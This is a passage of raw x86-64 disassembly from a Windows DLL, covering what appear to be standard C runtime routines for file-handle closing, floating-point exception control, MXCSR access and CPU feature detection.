   18000e5e3:	8b d8                	mov    %eax,%ebx
   18000e5e5:	85 c0                	test   %eax,%eax
   18000e5e7:	75 6a                	jne    0x18000e653
   18000e5e9:	ff 15 d1 1a 00 00    	call   *0x1ad1(%rip)        # 0x1800100c0
   18000e5ef:	83 f8 06             	cmp    $0x6,%eax
   18000e5f2:	75 5f                	jne    0x18000e653
   18000e5f4:	48 8b 0d c5 c3 00 00 	mov    0xc3c5(%rip),%rcx        # 0x18001a9c0
   18000e5fb:	48 83 f9 fd          	cmp    $0xfffffffffffffffd,%rcx
   18000e5ff:	77 06                	ja     0x18000e607
   18000e601:	ff 15 01 1a 00 00    	call   *0x1a01(%rip)        # 0x180010008
   18000e607:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   18000e60d:	48 8d 0d ec 78 00 00 	lea    0x78ec(%rip),%rcx        # 0x180015f00
   18000e614:	83 64 24 28 00       	andl   $0x0,0x28(%rsp)
   18000e619:	41 b8 03 00 00 00    	mov    $0x3,%r8d
   18000e61f:	45 33 c9             	xor    %r9d,%r9d
   18000e622:	44 89 44 24 20       	mov    %r8d,0x20(%rsp)
   18000e627:	ba 00 00 00 40       	mov    $0x40000000,%edx
   18000e62c:	ff 15 de 19 00 00    	call   *0x19de(%rip)        # 0x180010010
   18000e632:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   18000e638:	4c 8b cf             	mov    %rdi,%r9
   18000e63b:	48 8b c8             	mov    %rax,%rcx
   18000e63e:	48 89 05 7b c3 00 00 	mov    %rax,0xc37b(%rip)        # 0x18001a9c0
   18000e645:	44 8b c6             	mov    %esi,%r8d
   18000e648:	48 8b d5             	mov    %rbp,%rdx
   18000e64b:	ff 15 af 19 00 00    	call   *0x19af(%rip)        # 0x180010000
   18000e651:	8b d8                	mov    %eax,%ebx
   18000e653:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   18000e658:	8b c3                	mov    %ebx,%eax
   18000e65a:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   18000e65f:	48 8b 74 24 60       	mov    0x60(%rsp),%rsi
   18000e664:	48 83 c4 40          	add    $0x40,%rsp
   18000e668:	5f                   	pop    %rdi
   18000e669:	c3                   	ret
   18000e66a:	cc                   	int3
   18000e66b:	cc                   	int3
   18000e66c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000e671:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   18000e676:	57                   	push   %rdi
   18000e677:	48 83 ec 20          	sub    $0x20,%rsp
   18000e67b:	49 8b f9             	mov    %r9,%rdi
   18000e67e:	49 8b d8             	mov    %r8,%rbx
   18000e681:	8b 0a                	mov    (%rdx),%ecx
   18000e683:	e8 dc df ff ff       	call   0x18000c664
   18000e688:	90                   	nop
   18000e689:	48 8b 03             	mov    (%rbx),%rax
   18000e68c:	48 63 08             	movslq (%rax),%rcx
   18000e68f:	48 8b d1             	mov    %rcx,%rdx
   18000e692:	48 8b c1             	mov    %rcx,%rax
   18000e695:	48 c1 f8 06          	sar    $0x6,%rax
   18000e699:	4c 8d 05 90 d1 00 00 	lea    0xd190(%rip),%r8        # 0x18001b830
   18000e6a0:	83 e2 3f             	and    $0x3f,%edx
   18000e6a3:	48 8d 14 d2          	lea    (%rdx,%rdx,8),%rdx
   18000e6a7:	49 8b 04 c0          	mov    (%r8,%rax,8),%rax
   18000e6ab:	f6 44 d0 38 01       	testb  $0x1,0x38(%rax,%rdx,8)
   18000e6b0:	74 09                	je     0x18000e6bb
   18000e6b2:	e8 cd 00 00 00       	call   0x18000e784
   18000e6b7:	8b d8                	mov    %eax,%ebx
   18000e6b9:	eb 0e                	jmp    0x18000e6c9
   18000e6bb:	e8 3c 9b ff ff       	call   0x1800081fc
   18000e6c0:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   18000e6c6:	83 cb ff             	or     $0xffffffff,%ebx
   18000e6c9:	8b 0f                	mov    (%rdi),%ecx
   18000e6cb:	e8 bc df ff ff       	call   0x18000c68c
   18000e6d0:	8b c3                	mov    %ebx,%eax
   18000e6d2:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   18000e6d7:	48 83 c4 20          	add    $0x20,%rsp
   18000e6db:	5f                   	pop    %rdi
   18000e6dc:	c3                   	ret
   18000e6dd:	cc                   	int3
   18000e6de:	cc                   	int3
   18000e6df:	cc                   	int3
   18000e6e0:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   18000e6e4:	48 83 ec 38          	sub    $0x38,%rsp
   18000e6e8:	48 63 d1             	movslq %ecx,%rdx
   18000e6eb:	83 fa fe             	cmp    $0xfffffffe,%edx
   18000e6ee:	75 15                	jne    0x18000e705
   18000e6f0:	e8 e7 9a ff ff       	call   0x1800081dc
   18000e6f5:	83 20 00             	andl   $0x0,(%rax)
   18000e6f8:	e8 ff 9a ff ff       	call   0x1800081fc
   18000e6fd:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   18000e703:	eb 74                	jmp    0x18000e779
   18000e705:	85 c9                	test   %ecx,%ecx
   18000e707:	78 58                	js     0x18000e761
   18000e709:	3b 15 21 d5 00 00    	cmp    0xd521(%rip),%edx        # 0x18001bc30
   18000e70f:	73 50                	jae    0x18000e761
   18000e711:	48 8b ca             	mov    %rdx,%rcx
   18000e714:	4c 8d 05 15 d1 00 00 	lea    0xd115(%rip),%r8        # 0x18001b830
   18000e71b:	83 e1 3f             	and    $0x3f,%ecx
   18000e71e:	48 8b c2             	mov    %rdx,%rax
   18000e721:	48 c1 f8 06          	sar    $0x6,%rax
   18000e725:	48 8d 0c c9          	lea    (%rcx,%rcx,8),%rcx
   18000e729:	49 8b 04 c0          	mov    (%r8,%rax,8),%rax
   18000e72d:	f6 44 c8 38 01       	testb  $0x1,0x38(%rax,%rcx,8)
   18000e732:	74 2d                	je     0x18000e761
   18000e734:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   18000e739:	89 54 24 50          	mov    %edx,0x50(%rsp)
   18000e73d:	89 54 24 58          	mov    %edx,0x58(%rsp)
   18000e741:	4c 8d 4c 24 50       	lea    0x50(%rsp),%r9
   18000e746:	48 8d 54 24 58       	lea    0x58(%rsp),%rdx
   18000e74b:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   18000e750:	4c 8d 44 24 20       	lea    0x20(%rsp),%r8
   18000e755:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   18000e75a:	e8 0d ff ff ff       	call   0x18000e66c
   18000e75f:	eb 1b                	jmp    0x18000e77c
   18000e761:	e8 76 9a ff ff       	call   0x1800081dc
   18000e766:	83 20 00             	andl   $0x0,(%rax)
   18000e769:	e8 8e 9a ff ff       	call   0x1800081fc
   18000e76e:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   18000e774:	e8 c3 7e ff ff       	call   0x18000663c
   18000e779:	83 c8 ff             	or     $0xffffffff,%eax
   18000e77c:	48 83 c4 38          	add    $0x38,%rsp
   18000e780:	c3                   	ret
   18000e781:	cc                   	int3
   18000e782:	cc                   	int3
   18000e783:	cc                   	int3
   18000e784:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000e789:	57                   	push   %rdi
   18000e78a:	48 83 ec 20          	sub    $0x20,%rsp
   18000e78e:	48 63 f9             	movslq %ecx,%rdi
   18000e791:	8b cf                	mov    %edi,%ecx
   18000e793:	e8 d8 df ff ff       	call   0x18000c770
   18000e798:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   18000e79c:	75 04                	jne    0x18000e7a2
   18000e79e:	33 db                	xor    %ebx,%ebx
   18000e7a0:	eb 5a                	jmp    0x18000e7fc
   18000e7a2:	48 8b 05 87 d0 00 00 	mov    0xd087(%rip),%rax        # 0x18001b830
   18000e7a9:	b9 02 00 00 00       	mov    $0x2,%ecx
   18000e7ae:	83 ff 01             	cmp    $0x1,%edi
   18000e7b1:	75 09                	jne    0x18000e7bc
   18000e7b3:	40 84 b8 c8 00 00 00 	test   %dil,0xc8(%rax)
   18000e7ba:	75 0d                	jne    0x18000e7c9
   18000e7bc:	3b f9                	cmp    %ecx,%edi
   18000e7be:	75 20                	jne    0x18000e7e0
   18000e7c0:	f6 80 80 00 00 00 01 	testb  $0x1,0x80(%rax)
   18000e7c7:	74 17                	je     0x18000e7e0
   18000e7c9:	e8 a2 df ff ff       	call   0x18000c770
   18000e7ce:	b9 01 00 00 00       	mov    $0x1,%ecx
   18000e7d3:	48 8b d8             	mov    %rax,%rbx
   18000e7d6:	e8 95 df ff ff       	call   0x18000c770
   18000e7db:	48 3b c3             	cmp    %rbx,%rax
   18000e7de:	74 be                	je     0x18000e79e
   18000e7e0:	8b cf                	mov    %edi,%ecx
   18000e7e2:	e8 89 df ff ff       	call   0x18000c770
   18000e7e7:	48 8b c8             	mov    %rax,%rcx
   18000e7ea:	ff 15 18 18 00 00    	call   *0x1818(%rip)        # 0x180010008
   18000e7f0:	85 c0                	test   %eax,%eax
   18000e7f2:	75 aa                	jne    0x18000e79e
   18000e7f4:	ff 15 c6 18 00 00    	call   *0x18c6(%rip)        # 0x1800100c0
   18000e7fa:	8b d8                	mov    %eax,%ebx
   18000e7fc:	8b cf                	mov    %edi,%ecx
   18000e7fe:	e8 b1 de ff ff       	call   0x18000c6b4
   18000e803:	48 8b d7             	mov    %rdi,%rdx
   18000e806:	4c 8d 05 23 d0 00 00 	lea    0xd023(%rip),%r8        # 0x18001b830
   18000e80d:	83 e2 3f             	and    $0x3f,%edx
   18000e810:	48 8b cf             	mov    %rdi,%rcx
   18000e813:	48 c1 f9 06          	sar    $0x6,%rcx
   18000e817:	48 8d 14 d2          	lea    (%rdx,%rdx,8),%rdx
   18000e81b:	49 8b 0c c8          	mov    (%r8,%rcx,8),%rcx
   18000e81f:	c6 44 d1 38 00       	movb   $0x0,0x38(%rcx,%rdx,8)
   18000e824:	85 db                	test   %ebx,%ebx
   18000e826:	74 0c                	je     0x18000e834
   18000e828:	8b cb                	mov    %ebx,%ecx
   18000e82a:	e8 5d 99 ff ff       	call   0x18000818c
   18000e82f:	83 c8 ff             	or     $0xffffffff,%eax
   18000e832:	eb 02                	jmp    0x18000e836
   18000e834:	33 c0                	xor    %eax,%eax
   18000e836:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   18000e83b:	48 83 c4 20          	add    $0x20,%rsp
   18000e83f:	5f                   	pop    %rdi
   18000e840:	c3                   	ret
   18000e841:	cc                   	int3
   18000e842:	cc                   	int3
   18000e843:	cc                   	int3
   18000e844:	83 49 18 ff          	orl    $0xffffffff,0x18(%rcx)
   18000e848:	33 c0                	xor    %eax,%eax
   18000e84a:	48 89 01             	mov    %rax,(%rcx)
   18000e84d:	48 89 41 08          	mov    %rax,0x8(%rcx)
   18000e851:	89 41 10             	mov    %eax,0x10(%rcx)
   18000e854:	48 89 41 1c          	mov    %rax,0x1c(%rcx)
   18000e858:	48 89 41 28          	mov    %rax,0x28(%rcx)
   18000e85c:	87 41 14             	xchg   %eax,0x14(%rcx)
   18000e85f:	c3                   	ret
   18000e860:	48 8b c4             	mov    %rsp,%rax
   18000e863:	53                   	push   %rbx
   18000e864:	48 83 ec 50          	sub    $0x50,%rsp
   18000e868:	f2 0f 10 84 24 80 00 	movsd  0x80(%rsp),%xmm0
   18000e86f:	00 00 
   18000e871:	8b d9                	mov    %ecx,%ebx
   18000e873:	f2 0f 10 8c 24 88 00 	movsd  0x88(%rsp),%xmm1
   18000e87a:	00 00 
   18000e87c:	ba c0 ff 00 00       	mov    $0xffc0,%edx
   18000e881:	89 48 c8             	mov    %ecx,-0x38(%rax)
   18000e884:	48 8b 8c 24 90 00 00 	mov    0x90(%rsp),%rcx
   18000e88b:	00 
   18000e88c:	f2 0f 11 40 e0       	movsd  %xmm0,-0x20(%rax)
   18000e891:	f2 0f 11 48 e8       	movsd  %xmm1,-0x18(%rax)
   18000e896:	f2 0f 11 58 d8       	movsd  %xmm3,-0x28(%rax)
   18000e89b:	4c 89 40 d0          	mov    %r8,-0x30(%rax)
   18000e89f:	e8 24 07 00 00       	call   0x18000efc8
   18000e8a4:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   18000e8a9:	e8 fa bf ff ff       	call   0x18000a8a8
   18000e8ae:	85 c0                	test   %eax,%eax
   18000e8b0:	75 07                	jne    0x18000e8b9
   18000e8b2:	8b cb                	mov    %ebx,%ecx
   18000e8b4:	e8 bf 06 00 00       	call   0x18000ef78
   18000e8b9:	f2 0f 10 44 24 40    	movsd  0x40(%rsp),%xmm0
   18000e8bf:	48 83 c4 50          	add    $0x50,%rsp
   18000e8c3:	5b                   	pop    %rbx
   18000e8c4:	c3                   	ret
   18000e8c5:	cc                   	int3
   18000e8c6:	cc                   	int3
   18000e8c7:	cc                   	int3
   18000e8c8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000e8cd:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   18000e8d2:	57                   	push   %rdi
   18000e8d3:	48 83 ec 20          	sub    $0x20,%rsp
   18000e8d7:	8b d9                	mov    %ecx,%ebx
   18000e8d9:	48 8b f2             	mov    %rdx,%rsi
   18000e8dc:	83 e3 1f             	and    $0x1f,%ebx
   18000e8df:	8b f9                	mov    %ecx,%edi
   18000e8e1:	f6 c1 08             	test   $0x8,%cl
   18000e8e4:	74 14                	je     0x18000e8fa
   18000e8e6:	40 84 f6             	test   %sil,%sil
   18000e8e9:	79 0f                	jns    0x18000e8fa
   18000e8eb:	b9 01 00 00 00       	mov    $0x1,%ecx
   18000e8f0:	e8 4f 07 00 00       	call   0x18000f044
   18000e8f5:	83 e3 f7             	and    $0xfffffff7,%ebx
   18000e8f8:	eb 57                	jmp    0x18000e951
   18000e8fa:	b9 04 00 00 00       	mov    $0x4,%ecx
   18000e8ff:	40 84 f9             	test   %dil,%cl
   18000e902:	74 11                	je     0x18000e915
   18000e904:	48 0f ba e6 09       	bt     $0x9,%rsi
   18000e909:	73 0a                	jae    0x18000e915
   18000e90b:	e8 34 07 00 00       	call   0x18000f044
   18000e910:	83 e3 fb             	and    $0xfffffffb,%ebx
   18000e913:	eb 3c                	jmp    0x18000e951
   18000e915:	40 f6 c7 01          	test   $0x1,%dil
   18000e919:	74 16                	je     0x18000e931
   18000e91b:	48 0f ba e6 0a       	bt     $0xa,%rsi
   18000e920:	73 0f                	jae    0x18000e931
   18000e922:	b9 08 00 00 00       	mov    $0x8,%ecx
   18000e927:	e8 18 07 00 00       	call   0x18000f044
   18000e92c:	83 e3 fe             	and    $0xfffffffe,%ebx
   18000e92f:	eb 20                	jmp    0x18000e951
   18000e931:	40 f6 c7 02          	test   $0x2,%dil
   18000e935:	74 1a                	je     0x18000e951
   18000e937:	48 0f ba e6 0b       	bt     $0xb,%rsi
   18000e93c:	73 13                	jae    0x18000e951
   18000e93e:	40 f6 c7 10          	test   $0x10,%dil
   18000e942:	74 0a                	je     0x18000e94e
   18000e944:	b9 10 00 00 00       	mov    $0x10,%ecx
   18000e949:	e8 f6 06 00 00       	call   0x18000f044
   18000e94e:	83 e3 fd             	and    $0xfffffffd,%ebx
   18000e951:	40 f6 c7 10          	test   $0x10,%dil
   18000e955:	74 14                	je     0x18000e96b
   18000e957:	48 0f ba e6 0c       	bt     $0xc,%rsi
   18000e95c:	73 0d                	jae    0x18000e96b
   18000e95e:	b9 20 00 00 00       	mov    $0x20,%ecx
   18000e963:	e8 dc 06 00 00       	call   0x18000f044
   18000e968:	83 e3 ef             	and    $0xffffffef,%ebx
   18000e96b:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   18000e970:	33 c0                	xor    %eax,%eax
   18000e972:	85 db                	test   %ebx,%ebx
   18000e974:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   18000e979:	0f 94 c0             	sete   %al
   18000e97c:	48 83 c4 20          	add    $0x20,%rsp
   18000e980:	5f                   	pop    %rdi
   18000e981:	c3                   	ret
   18000e982:	cc                   	int3
   18000e983:	cc                   	int3
   18000e984:	48 8b c4             	mov    %rsp,%rax
   18000e987:	55                   	push   %rbp
   18000e988:	53                   	push   %rbx
   18000e989:	56                   	push   %rsi
   18000e98a:	57                   	push   %rdi
   18000e98b:	41 56                	push   %r14
   18000e98d:	48 8d 68 c9          	lea    -0x37(%rax),%rbp
   18000e991:	48 81 ec f0 00 00 00 	sub    $0xf0,%rsp
   18000e998:	0f 29 70 c8          	movaps %xmm6,-0x38(%rax)
   18000e99c:	48 8b 05 6d b6 00 00 	mov    0xb66d(%rip),%rax        # 0x18001a010
   18000e9a3:	48 33 c4             	xor    %rsp,%rax
   18000e9a6:	48 89 45 ef          	mov    %rax,-0x11(%rbp)
   18000e9aa:	8b f2                	mov    %edx,%esi
   18000e9ac:	4c 8b f1             	mov    %rcx,%r14
   18000e9af:	ba c0 ff 00 00       	mov    $0xffc0,%edx
   18000e9b4:	b9 80 1f 00 00       	mov    $0x1f80,%ecx
   18000e9b9:	41 8b f9             	mov    %r9d,%edi
   18000e9bc:	49 8b d8             	mov    %r8,%rbx
   18000e9bf:	e8 04 06 00 00       	call   0x18000efc8
   18000e9c4:	8b 4d 5f             	mov    0x5f(%rbp),%ecx
   18000e9c7:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   18000e9cc:	48 89 5c 24 50       	mov    %rbx,0x50(%rsp)
   18000e9d1:	f2 0f 10 44 24 50    	movsd  0x50(%rsp),%xmm0
   18000e9d7:	48 8b 54 24 40       	mov    0x40(%rsp),%rdx
   18000e9dc:	f2 0f 11 44 24 48    	movsd  %xmm0,0x48(%rsp)
   18000e9e2:	e8 e1 fe ff ff       	call   0x18000e8c8
   18000e9e7:	f2 0f 10 75 77       	movsd  0x77(%rbp),%xmm6
   18000e9ec:	85 c0                	test   %eax,%eax
   18000e9ee:	75 40                	jne    0x18000ea30
   18000e9f0:	83 7d 7f 02          	cmpl   $0x2,0x7f(%rbp)
   18000e9f4:	75 11                	jne    0x18000ea07
   18000e9f6:	8b 45 bf             	mov    -0x41(%rbp),%eax
   18000e9f9:	83 e0 e3             	and    $0xffffffe3,%eax
   18000e9fc:	f2 0f 11 75 af       	movsd  %xmm6,-0x51(%rbp)
   18000ea01:	83 c8 03             	or     $0x3,%eax
   18000ea04:	89 45 bf             	mov    %eax,-0x41(%rbp)
   18000ea07:	44 8b 45 5f          	mov    0x5f(%rbp),%r8d
   18000ea0b:	48 8d 44 24 48       	lea    0x48(%rsp),%rax
   18000ea10:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   18000ea15:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   18000ea1a:	48 8d 45 6f          	lea    0x6f(%rbp),%rax
   18000ea1e:	44 8b ce             	mov    %esi,%r9d
   18000ea21:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   18000ea26:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   18000ea2b:	e8 10 02 00 00       	call   0x18000ec40
   18000ea30:	e8 4b be ff ff       	call   0x18000a880
   18000ea35:	84 c0                	test   %al,%al
   18000ea37:	74 34                	je     0x18000ea6d
   18000ea39:	85 ff                	test   %edi,%edi
   18000ea3b:	74 30                	je     0x18000ea6d
   18000ea3d:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   18000ea42:	4d 8b c6             	mov    %r14,%r8
   18000ea45:	f2 0f 10 44 24 48    	movsd  0x48(%rsp),%xmm0
   18000ea4b:	8b cf                	mov    %edi,%ecx
   18000ea4d:	f2 0f 10 5d 6f       	movsd  0x6f(%rbp),%xmm3
   18000ea52:	8b 55 67             	mov    0x67(%rbp),%edx
   18000ea55:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   18000ea5a:	f2 0f 11 44 24 28    	movsd  %xmm0,0x28(%rsp)
   18000ea60:	f2 0f 11 74 24 20    	movsd  %xmm6,0x20(%rsp)
   18000ea66:	e8 f5 fd ff ff       	call   0x18000e860
   18000ea6b:	eb 1c                	jmp    0x18000ea89
   18000ea6d:	8b cf                	mov    %edi,%ecx
   18000ea6f:	e8 04 05 00 00       	call   0x18000ef78
   18000ea74:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   18000ea79:	ba c0 ff 00 00       	mov    $0xffc0,%edx
   18000ea7e:	e8 45 05 00 00       	call   0x18000efc8
   18000ea83:	f2 0f 10 44 24 48    	movsd  0x48(%rsp),%xmm0
   18000ea89:	48 8b 4d ef          	mov    -0x11(%rbp),%rcx
   18000ea8d:	48 33 cc             	xor    %rsp,%rcx
   18000ea90:	e8 2b 30 ff ff       	call   0x180001ac0
   18000ea95:	0f 28 b4 24 e0 00 00 	movaps 0xe0(%rsp),%xmm6
   18000ea9c:	00 
   18000ea9d:	48 81 c4 f0 00 00 00 	add    $0xf0,%rsp
   18000eaa4:	41 5e                	pop    %r14
   18000eaa6:	5f                   	pop    %rdi
   18000eaa7:	5e                   	pop    %rsi
   18000eaa8:	5b                   	pop    %rbx
   18000eaa9:	5d                   	pop    %rbp
   18000eaaa:	c3                   	ret
   18000eaab:	cc                   	int3
   18000eaac:	cc                   	int3
   18000eaad:	cc                   	int3
   18000eaae:	cc                   	int3
   18000eaaf:	cc                   	int3
   18000eab0:	40 53                	rex push %rbx
   18000eab2:	48 83 ec 10          	sub    $0x10,%rsp
   18000eab6:	45 33 c0             	xor    %r8d,%r8d
   18000eab9:	33 c9                	xor    %ecx,%ecx
   18000eabb:	44 89 05 ee d1 00 00 	mov    %r8d,0xd1ee(%rip)        # 0x18001bcb0
   18000eac2:	45 8d 48 01          	lea    0x1(%r8),%r9d
   18000eac6:	41 8b c1             	mov    %r9d,%eax
   18000eac9:	0f a2                	cpuid
   18000eacb:	89 04 24             	mov    %eax,(%rsp)
   18000eace:	b8 00 10 00 18       	mov    $0x18001000,%eax
   18000ead3:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   18000ead7:	23 c8                	and    %eax,%ecx
   18000ead9:	89 5c 24 04          	mov    %ebx,0x4(%rsp)
   18000eadd:	89 54 24 0c          	mov    %edx,0xc(%rsp)
   18000eae1:	3b c8                	cmp    %eax,%ecx
   18000eae3:	75 2c                	jne    0x18000eb11
   18000eae5:	33 c9                	xor    %ecx,%ecx
   18000eae7:	0f 01 d0             	xgetbv
   18000eaea:	48 c1 e2 20          	shl    $0x20,%rdx
   18000eaee:	48 0b d0             	or     %rax,%rdx
   18000eaf1:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   18000eaf6:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   18000eafb:	44 8b 05 ae d1 00 00 	mov    0xd1ae(%rip),%r8d        # 0x18001bcb0
   18000eb02:	24 06                	and    $0x6,%al
   18000eb04:	3c 06                	cmp    $0x6,%al
   18000eb06:	45 0f 44 c1          	cmove  %r9d,%r8d
   18000eb0a:	44 89 05 9f d1 00 00 	mov    %r8d,0xd19f(%rip)        # 0x18001bcb0
   18000eb11:	44 89 05 9c d1 00 00 	mov    %r8d,0xd19c(%rip)        # 0x18001bcb4
   18000eb18:	33 c0                	xor    %eax,%eax
   18000eb1a:	48 83 c4 10          	add    $0x10,%rsp
   18000eb1e:	5b                   	pop    %rbx
   18000eb1f:	c3                   	ret
   18000eb20:	48 83 ec 38          	sub    $0x38,%rsp
   18000eb24:	48 8d 05 15 8c 00 00 	lea    0x8c15(%rip),%rax        # 0x180017740
   18000eb2b:	41 b9 1b 00 00 00    	mov    $0x1b,%r9d
   18000eb31:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   18000eb36:	e8 05 00 00 00       	call   0x18000eb40
   18000eb3b:	48 83 c4 38          	add    $0x38,%rsp
   18000eb3f:	c3                   	ret
   18000eb40:	48 8b c4             	mov    %rsp,%rax
   18000eb43:	48 83 ec 68          	sub    $0x68,%rsp
   18000eb47:	0f 29 70 e8          	movaps %xmm6,-0x18(%rax)
   18000eb4b:	0f 28 f1             	movaps %xmm1,%xmm6
   18000eb4e:	41 8b d1             	mov    %r9d,%edx
   18000eb51:	0f 28 d8             	movaps %xmm0,%xmm3
   18000eb54:	41 83 e8 01          	sub    $0x1,%r8d
   18000eb58:	74 2a                	je     0x18000eb84
   18000eb5a:	41 83 f8 01          	cmp    $0x1,%r8d
   18000eb5e:	75 69                	jne    0x18000ebc9
   18000eb60:	44 89 40 d8          	mov    %r8d,-0x28(%rax)
   18000eb64:	0f 57 d2             	xorps  %xmm2,%xmm2
   18000eb67:	f2 0f 11 50 d0       	movsd  %xmm2,-0x30(%rax)
   18000eb6c:	45 8b c8             	mov    %r8d,%r9d
   18000eb6f:	f2 0f 11 40 c8       	movsd  %xmm0,-0x38(%rax)
   18000eb74:	c7 40 c0 21 00 00 00 	movl   $0x21,-0x40(%rax)
   18000eb7b:	c7 40 b8 08 00 00 00 	movl   $0x8,-0x48(%rax)
   18000eb82:	eb 2d                	jmp    0x18000ebb1
   18000eb84:	c7 44 24 40 01 00 00 	movl   $0x1,0x40(%rsp)
   18000eb8b:	00 
   18000eb8c:	0f 57 c0             	xorps  %xmm0,%xmm0
   18000eb8f:	f2 0f 11 44 24 38    	movsd  %xmm0,0x38(%rsp)
   18000eb95:	41 b9 02 00 00 00    	mov    $0x2,%r9d
   18000eb9b:	f2 0f 11 5c 24 30    	movsd  %xmm3,0x30(%rsp)
   18000eba1:	c7 44 24 28 22 00 00 	movl   $0x22,0x28(%rsp)
   18000eba8:	00 
   18000eba9:	c7 44 24 20 04 00 00 	movl   $0x4,0x20(%rsp)
   18000ebb0:	00 
   18000ebb1:	48 8b 8c 24 90 00 00 	mov    0x90(%rsp),%rcx
   18000ebb8:	00 
   18000ebb9:	f2 0f 11 74 24 78    	movsd  %xmm6,0x78(%rsp)
   18000ebbf:	4c 8b 44 24 78       	mov    0x78(%rsp),%r8
   18000ebc4:	e8 bb fd ff ff       	call   0x18000e984
   18000ebc9:	0f 28 c6             	movaps %xmm6,%xmm0
   18000ebcc:	0f 28 74 24 50       	movaps 0x50(%rsp),%xmm6
   18000ebd1:	48 83 c4 68          	add    $0x68,%rsp
   18000ebd5:	c3                   	ret
   18000ebd6:	cc                   	int3
   18000ebd7:	cc                   	int3
   18000ebd8:	cc                   	int3
   18000ebd9:	cc                   	int3
   18000ebda:	cc                   	int3
   18000ebdb:	cc                   	int3
   18000ebdc:	cc                   	int3
   18000ebdd:	cc                   	int3
   18000ebde:	cc                   	int3
   18000ebdf:	cc                   	int3
   18000ebe0:	cc                   	int3
   18000ebe1:	cc                   	int3
   18000ebe2:	cc                   	int3
   18000ebe3:	cc                   	int3
   18000ebe4:	cc                   	int3
   18000ebe5:	cc                   	int3
   18000ebe6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   18000ebed:	00 00 00 
   18000ebf0:	48 83 ec 08          	sub    $0x8,%rsp
   18000ebf4:	0f ae 1c 24          	stmxcsr (%rsp)
   18000ebf8:	8b 04 24             	mov    (%rsp),%eax
   18000ebfb:	48 83 c4 08          	add    $0x8,%rsp
   18000ebff:	c3                   	ret
   18000ec00:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   18000ec04:	0f ae 54 24 08       	ldmxcsr 0x8(%rsp)
   18000ec09:	c3                   	ret
   18000ec0a:	0f ae 5c 24 08       	stmxcsr 0x8(%rsp)
   18000ec0f:	b9 c0 ff ff ff       	mov    $0xffffffc0,%ecx
   18000ec14:	21 4c 24 08          	and    %ecx,0x8(%rsp)
   18000ec18:	0f ae 54 24 08       	ldmxcsr 0x8(%rsp)
   18000ec1d:	c3                   	ret
   18000ec1e:	66 0f 2e 05 2a 8b 00 	ucomisd 0x8b2a(%rip),%xmm0        # 0x180017750
   18000ec25:	00 
   18000ec26:	73 14                	jae    0x18000ec3c
   18000ec28:	66 0f 2e 05 28 8b 00 	ucomisd 0x8b28(%rip),%xmm0        # 0x180017758
   18000ec2f:	00 
   18000ec30:	76 0a                	jbe    0x18000ec3c
   18000ec32:	f2 48 0f 2d c8       	cvtsd2si %xmm0,%rcx
   18000ec37:	f2 48 0f 2a c1       	cvtsi2sd %rcx,%xmm0
   18000ec3c:	c3                   	ret
   18000ec3d:	cc                   	int3
   18000ec3e:	cc                   	int3
   18000ec3f:	cc                   	int3
   18000ec40:	48 83 ec 48          	sub    $0x48,%rsp
   18000ec44:	83 64 24 30 00       	andl   $0x0,0x30(%rsp)
   18000ec49:	48 8b 44 24 78       	mov    0x78(%rsp),%rax
   18000ec4e:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   18000ec53:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   18000ec58:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   18000ec5d:	e8 06 00 00 00       	call   0x18000ec68
   18000ec62:	48 83 c4 48          	add    $0x48,%rsp
   18000ec66:	c3                   	ret
   18000ec67:	cc                   	int3
   18000ec68:	48 8b c4             	mov    %rsp,%rax
   18000ec6b:	48 89 58 10          	mov    %rbx,0x10(%rax)
   18000ec6f:	48 89 70 18          	mov    %rsi,0x18(%rax)
   18000ec73:	48 89 78 20          	mov    %rdi,0x20(%rax)
   18000ec77:	48 89 48 08          	mov    %rcx,0x8(%rax)
   18000ec7b:	55                   	push   %rbp
   18000ec7c:	48 8b ec             	mov    %rsp,%rbp
   18000ec7f:	48 83 ec 20          	sub    $0x20,%rsp
   18000ec83:	48 8b da             	mov    %rdx,%rbx
   18000ec86:	41 8b f1             	mov    %r9d,%esi
   18000ec89:	33 d2                	xor    %edx,%edx
   18000ec8b:	bf 0d 00 00 c0       	mov    $0xc000000d,%edi
   18000ec90:	89 51 04             	mov    %edx,0x4(%rcx)
   18000ec93:	48 8b 45 10          	mov    0x10(%rbp),%rax
   18000ec97:	89 50 08             	mov    %edx,0x8(%rax)
